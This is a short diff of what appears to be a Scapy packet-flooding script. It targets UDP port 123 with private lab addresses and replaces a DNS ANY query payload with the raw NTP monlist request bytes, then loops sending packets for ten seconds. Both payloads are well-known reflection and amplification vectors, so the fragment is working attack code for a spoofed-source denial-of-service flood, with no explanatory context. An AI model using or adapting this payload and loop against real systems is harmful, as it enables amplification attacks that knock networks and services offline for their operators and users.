@@ -5,7 +5,7 @@ A= "192.168.30.1"
 B= "192.168.20.1"
 C= RandShort()
 D= 123
-E= DNS(rd=1,qd=DNSQR(qname="google.com",qtype="ANY"))
+E= "\x17\x00\x03\x2a" + "\x00" * 44
 
 start = time.time()
 while (time.time() - start < 10):
